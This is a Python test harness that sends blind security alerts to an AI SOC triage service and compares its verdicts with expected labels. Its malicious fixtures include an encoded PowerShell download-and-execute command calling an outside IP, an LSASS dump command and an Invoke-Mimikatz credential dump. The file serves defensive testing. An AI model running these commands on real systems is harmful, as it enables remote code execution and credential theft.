#!/usr/bin/env python3
"""
Blind AI Analysis Test
======================

Tests AI's ability to correctly identify threats WITHOUT giving away the answer
in the alert name. The AI must analyze the actual behavior/evidence.

All alerts have NEUTRAL names like "Process Execution Detected" or "Network Activity".
The AI must determine benign vs malicious from:
- Process command lines
- Network destinations
- File paths
- User behavior patterns

Usage:
    python scripts/test_blind_analysis.py --all        # Run all blind tests
    python scripts/test_blind_analysis.py --benign     # Benign scenarios only
    python scripts/test_blind_analysis.py --malicious  # Malicious scenarios only
"""

import requests
import time
import argparse
from datetime import datetime

BASE_URL = "http://localhost:5000"
API_KEY = "secure-ingest-key-123"
HEADERS = {"X-API-Key": API_KEY, "Content-Type": "application/json"}

# =============================================================================
# BLIND TEST ALERTS - Neutral names, behavior tells the story
# =============================================================================

# These are BENIGN but the AI doesn't know from the name
BLIND_BENIGN = [
    {
        "alert_name": "Process Execution Detected",
        "severity": "medium",
        "description": "svchost.exe spawned with command: C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv",
        "source_ip": "10.0.0.50",
        "dest_ip": "10.0.0.1",
        "hostname": "WORKSTATION-PC",
        "username": "SYSTEM",
        "mitre_technique": "T1059",
        "_expected": "BENIGN",
        "_reason": "svchost.exe running Windows Update service (wuauserv) is normal"
    },
    {
        "alert_name": "Outbound Network Connection",
        "severity": "medium",
        "description": "Connection to 13.107.42.14:443 (Microsoft Update servers) from trusted process",
        "source_ip": "10.0.0.75",
        "dest_ip": "13.107.42.14",
        "hostname": "FINANCE-PC",
        "username": "SYSTEM",
        "mitre_technique": "T1071",
        "_expected": "BENIGN",
        "_reason": "Connection to known Microsoft IP for updates"
    },
    {
        "alert_name": "Scheduled Task Created",
        "severity": "medium",
        "description": "Task 'GoogleUpdateTaskMachineCore' created by C:\\Program Files\\Google\\Update\\GoogleUpdate.exe",
        "source_ip": "10.0.0.45",
        "dest_ip": "10.0.0.1",
        "hostname": "HR-LAPTOP",
        "username": "SYSTEM",
        "mitre_technique": "T1053",
        "_expected": "BENIGN",
        "_reason": "Google Chrome auto-updater creating scheduled task is normal"
    },
    {
        "alert_name": "PowerShell Execution",
        "severity": "medium",
        "description": "powershell.exe -ExecutionPolicy Bypass -File C:\\IT\\Scripts\\disk-cleanup.ps1",
        "source_ip": "10.0.0.5",
        "dest_ip": "10.0.0.100",
        "hostname": "IT-ADMIN-PC",
        "username": "it.admin",
        "mitre_technique": "T1059.001",
        "_expected": "BENIGN",
        "_reason": "IT admin running maintenance script from IT folder"
    },
    {
        "alert_name": "Remote Desktop Connection",
        "severity": "medium",
        "description": "RDP session from 10.0.0.5 (IT-HELPDESK) to 10.0.0.90 during business hours 10:30 AM",
        "source_ip": "10.0.0.5",
        "dest_ip": "10.0.0.90",
        "hostname": "IT-HELPDESK",
        "username": "helpdesk.tech",
        "mitre_technique": "T1021.001",
        "_expected": "BENIGN",
        "_reason": "IT helpdesk RDP to user machine during work hours is normal"
    },
    {
        "alert_name": "File Access Detected",
        "severity": "low",
        "description": "User accessed \\\\fileserver\\shared\\reports\\Q4-2025-sales.xlsx via SMB",
        "source_ip": "10.0.0.60",
        "dest_ip": "10.0.0.200",
        "hostname": "SALES-PC",
        "username": "sales.manager",
        "mitre_technique": "T1039",
        "_expected": "BENIGN",
        "_reason": "Sales employee accessing sales reports on shared drive"
    },
    {
        "alert_name": "DNS Query Detected",
        "severity": "low",
        "description": "DNS query for outlook.office365.com from Outlook.exe process",
        "source_ip": "10.0.0.80",
        "dest_ip": "10.0.0.1",
        "hostname": "EXEC-LAPTOP",
        "username": "cfo",
        "mitre_technique": "T1071.004",
        "_expected": "BENIGN",
        "_reason": "Outlook querying Office 365 DNS is normal email activity"
    },
    {
        "alert_name": "Process Execution Detected",
        "severity": "low",
        "description": "MsMpEng.exe (Windows Defender) performing scheduled scan of C:\\Users",
        "source_ip": "10.0.0.55",
        "dest_ip": "10.0.0.55",
        "hostname": "DEV-WORKSTATION",
        "username": "SYSTEM",
        "mitre_technique": "T1059",
        "_expected": "BENIGN",
        "_reason": "Windows Defender antivirus scanning is normal"
    },
]

# These are MALICIOUS but the AI doesn't know from the name
BLIND_MALICIOUS = [
    {
        "alert_name": "Process Execution Detected",
        "severity": "high",
        "description": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA1AC8AcwBoAGUAbABsAC4AcABzADEAJwApAA==",
        "source_ip": "10.0.0.99",
        "dest_ip": "185.220.101.45",
        "hostname": "ACCT-PC-003",
        "username": "accounting.user",
        "mitre_technique": "T1059.001",
        "_expected": "MALICIOUS",
        "_reason": "Base64 encoded PowerShell downloading from Tor exit node IP"
    },
    {
        "alert_name": "Process Execution Detected",
        "severity": "high",
        "description": "cmd.exe spawned rundll32.exe comsvcs.dll MiniDump 624 C:\\temp\\lsass.dmp full",
        "source_ip": "10.0.0.150",
        "dest_ip": "10.0.0.1",
        "hostname": "SERVER-DC01",
        "username": "unknown",
        "mitre_technique": "T1003",
        "_expected": "MALICIOUS",
        "_reason": "LSASS memory dump via comsvcs.dll is credential theft technique"
    },
    {
        "alert_name": "Outbound Network Connection",
        "severity": "high",
        "description": "Connection to 23.129.64.10:443 with 50MB data transfer at 3:00 AM from non-standard process",
        "source_ip": "10.0.0.120",
        "dest_ip": "23.129.64.10",
        "hostname": "RESEARCH-SERVER",
        "username": "SYSTEM",
        "mitre_technique": "T1041",
        "_expected": "MALICIOUS",
        "_reason": "Large data transfer to unknown IP at 3 AM suggests exfiltration"
    },
    {
        "alert_name": "File Activity Detected",
        "severity": "critical",
        "description": "Process encrypting files in C:\\Users with .locked extension, 500+ files modified in 60 seconds",
        "source_ip": "10.0.0.88",
        "dest_ip": "10.0.0.88",
        "hostname": "FINANCE-WS",
        "username": "finance.user",
        "mitre_technique": "T1486",
        "_expected": "MALICIOUS",
        "_reason": "Rapid file encryption with .locked extension is ransomware"
    },
    {
        "alert_name": "Remote Execution Detected",
        "severity": "high",
        "description": "WMIC process call create on remote system 10.0.0.101 from compromised account",
        "source_ip": "10.0.0.50",
        "dest_ip": "10.0.0.101",
        "hostname": "INFECTED-PC",
        "username": "admin",
        "mitre_technique": "T1047",
        "_expected": "MALICIOUS",
        "_reason": "WMI remote execution is lateral movement technique"
    },
    {
        "alert_name": "DNS Query Detected",
        "severity": "high",
        "description": "DNS queries to aW5mby5leGZpbC5jb20= encoded subdomain pattern, 200+ queries in 5 minutes",
        "source_ip": "10.0.0.130",
        "dest_ip": "8.8.8.8",
        "hostname": "COMPROMISED-SERVER",
        "username": "SYSTEM",
        "mitre_technique": "T1048.003",
        "_expected": "MALICIOUS",
        "_reason": "High volume encoded DNS queries indicate DNS tunneling/exfiltration"
    },
    {
        "alert_name": "Scheduled Task Created",
        "severity": "high",
        "description": "Task 'WindowsUpdate' created pointing to C:\\Users\\Public\\svchost.exe with SYSTEM privileges",
        "source_ip": "10.0.0.77",
        "dest_ip": "10.0.0.1",
        "hostname": "VICTIM-PC",
        "username": "attacker",
        "mitre_technique": "T1053.005",
        "_expected": "MALICIOUS",
        "_reason": "Fake Windows task pointing to Public folder with fake svchost.exe is persistence"
    },
    {
        "alert_name": "PowerShell Execution",
        "severity": "high",
        "description": "powershell.exe Invoke-Mimikatz -DumpCreds executed from memory, no file on disk",
        "source_ip": "10.0.0.66",
        "dest_ip": "10.0.0.1",
        "hostname": "TARGET-SERVER",
        "username": "compromised.admin",
        "mitre_technique": "T1003.001",
        "_expected": "MALICIOUS",
        "_reason": "Invoke-Mimikatz is well-known credential dumping tool"
    },
]


def send_alert(alert, verbose=True):
    """Send alert and return result"""
    # Remove test metadata before sending
    clean_alert = {k: v for k, v in alert.items() if not k.startswith('_')}
    
    try:
        response = requests.post(
            f"{BASE_URL}/ingest",
            headers=HEADERS,
            json=clean_alert,
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            if verbose:
                expected = alert.get('_expected', 'UNKNOWN')
                print(f"  [SENT] {alert['alert_name'][:35]:<35} | Expected: {expected:<10} | ID: {data.get('alert_id', 'N/A')[:8]}...")
            return True, data
        else:
            if verbose:
                print(f"  [ERROR] {response.status_code}: {response.text[:50]}")
            return False, None
    except Exception as e:
        if verbose:
            print(f"  [ERROR] {str(e)[:50]}")
        return False, None


def run_blind_test(alerts, test_name):
    """Run blind test and track results"""
    print("\n" + "="*80)
    print(f"BLIND TEST: {test_name}")
    print("="*80)
    print("AI must analyze BEHAVIOR, not alert names!")
    print("-"*80)
    
    results = []
    for alert in alerts:
        ok, data = send_alert(alert)
        if ok:
            results.append({
                'alert_id': data.get('alert_id'),
                'expected': alert.get('_expected'),
                'reason': alert.get('_reason'),
                'description': alert.get('description')[:60]
            })
        time.sleep(1)  # Give AI time to process
    
    print("-"*80)
    print(f"Sent: {len(results)} alerts")
    print("\nExpected outcomes:")
    for r in results:
        print(f"  • {r['expected']}: {r['reason'][:60]}")
    print("="*80)
    
    return results


def check_results():
    """Check AI verdicts against expected outcomes"""
    print("\n" + "="*80)
    print("CHECKING AI VERDICTS")
    print("="*80)
    
    try:
        response = requests.get(f"{BASE_URL}/alerts", timeout=10)
        if response.status_code != 200:
            print("[ERROR] Could not fetch alerts")
            return
        
        alerts = response.json().get('alerts', [])
        
        # Check recent alerts (last 20)
        recent = alerts[:20]
        
        correct = 0
        incorrect = 0
        pending = 0
        
        print("\nRecent Alert Verdicts:")
        print("-"*80)
        print(f"{'Alert Name':<40} | {'AI Verdict':<12} | {'Confidence':<10}")
        print("-"*80)
        
        for alert in recent:
            name = alert.get('alert_name', 'Unknown')[:40]
            verdict = alert.get('ai_verdict', 'PENDING')
            confidence = alert.get('ai_confidence', 0)
            
            if verdict and verdict != 'PENDING':
                conf_str = f"{confidence*100:.0f}%" if confidence else "N/A"
                print(f"{name:<40} | {verdict:<12} | {conf_str:<10}")
            else:
                pending += 1
        
        print("-"*80)
        print(f"Pending analysis: {pending}")
        print("="*80)
        
    except Exception as e:
        print(f"[ERROR] {e}")


def main():
    parser = argparse.ArgumentParser(description='Blind AI Analysis Test')
    parser.add_argument('--benign', action='store_true', help='Test benign scenarios')
    parser.add_argument('--malicious', action='store_true', help='Test malicious scenarios')
    parser.add_argument('--check', action='store_true', help='Check results only')
    parser.add_argument('--all', action='store_true', help='Run all tests')
    
    args = parser.parse_args()
    
    print("\n" + "="*80)
    print("AI-SOC WATCHDOG - BLIND ANALYSIS TEST")
    print("="*80)
    print("Testing if AI can identify threats from BEHAVIOR, not alert names")
    print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*80)
    
    # Check backend
    try:
        requests.get(f"{BASE_URL}/queue-status", timeout=5)
        print("[OK] Backend is running")
    except:
        print("[ERROR] Backend not running! Start with: python app.py")
        return
    
    if args.check:
        check_results()
        return
    
    if args.all or (not any([args.benign, args.malicious])):
        run_blind_test(BLIND_BENIGN, "BENIGN SCENARIOS (Should be marked BENIGN)")
        time.sleep(2)
        run_blind_test(BLIND_MALICIOUS, "MALICIOUS SCENARIOS (Should be marked MALICIOUS)")
    else:
        if args.benign:
            run_blind_test(BLIND_BENIGN, "BENIGN SCENARIOS")
        if args.malicious:
            run_blind_test(BLIND_MALICIOUS, "MALICIOUS SCENARIOS")
    
    print("\n" + "="*80)
    print("TEST COMPLETE")
    print("="*80)
    print("\nWait 1-2 minutes for AI analysis, then run:")
    print("  python scripts/test_blind_analysis.py --check")
    print("\nOr check the Analyst Dashboard to see verdicts.")
    print("="*80)


if __name__ == '__main__':
    main()
